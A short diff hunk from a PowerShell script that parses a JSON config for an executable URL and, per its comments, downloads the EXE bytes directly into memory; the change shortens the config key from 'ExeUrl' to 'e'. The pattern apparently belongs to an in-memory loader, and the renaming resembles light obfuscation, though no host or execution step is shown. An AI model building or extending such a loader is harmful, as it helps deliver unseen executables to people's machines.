@@ -7,7 +7,7 @@ try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls1
 
 # Parse EXE URL from config
 $cfg=$c|ConvertFrom-Json
-$exeUrl=$cfg.ExeUrl
+$exeUrl=$cfg.e
 
 # Download EXE bytes directly into memory
 $bytes=$null
